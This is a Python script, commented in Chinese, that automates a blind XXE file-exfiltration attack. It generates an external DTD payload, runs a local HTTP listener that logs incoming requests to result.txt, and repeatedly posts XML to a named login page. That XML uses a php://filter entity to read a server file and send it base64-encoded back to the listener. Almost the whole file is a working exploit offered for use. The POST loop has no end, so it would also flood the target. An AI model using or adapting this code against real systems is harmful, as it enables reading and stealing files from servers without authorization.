# coding=utf-8

from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import requests
import sys


# 编写请求打印类
class Handler(SimpleHTTPRequestHandler):

    def log_message(self, format: str, *args) -> None:
        sys.stderr.write("%s -- [%s] %s\n" % (self.client_address[0], self.log_date_time_string(), format % args))
        # 写入文件
        textFiles = open("result.txt", "a")
        textFiles.write("%s -- [%s] %s\n" % (self.client_address[0], self.log_date_time_string(), format % args))
        textFiles.close()


# payload 生成xml函数，生成后放在服务器里面
def XMLPayload(ip, port):
    file = open("xxe.xml", "w")
    file.write(
        "<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://{0}:{1}/?content=%file;'>\"> %payload ;".format(ip,
                                                                                                                  port))
    file.close()
    print("plyload in xxe.xml create succen")


# 同时开启http服务请求
def StartHttpServer(ip, port):
    serverAddr = (ip, port)
    httpDil = HTTPServer(serverAddr, Handler)
    print("已开启http服务 ======================= ip地址:{0}:端口:{1}".format(ip, port))
    httpDil.serve_forever()


def SendDate(ip, port, url):
    # 需要读取的文件地址
    FilePath = "/www/wwwroot/yuhen/img_yuhen/xxe"
    # 将死循环更改
    while True:
        # for i in range(1,5):
        # 正则提取内容
        FilePath = FilePath.replace("\\", "/")
        # xml格式化字符串
        data = "<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource={0}\">\n<!ENTITY % dtd SYSTEM \"http://{1}:{2}/xxe.xml\">\n%dtd;\n%send;\n]>".format(
            FilePath, ip, port)
        # data = "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY  xxe SYSTEM 'file:///c:/a.txt' >]>"
        requests.post(url, data=data)
    # FilePath = input("Input FilePath:")


# XMLPayload("127.0.01", "5000")


if __name__ == '__main__':
    ip = "127.0.0.1"
    port = 8989
    url = "https://www.yuhenm.com/img_yuhen/xxe/doLogin.php"
    # 生成xml文件
    XMLPayload(ip, port)
    # 开启http服务多线程
    threadHTTP = threading.Thread(target=StartHttpServer, args=(ip, port))
    threadHTTP.start()
    # 开启post请求线程
    threadPost = threading.Thread(target=SendDate, args=(ip, port, url))
    threadPost.start()
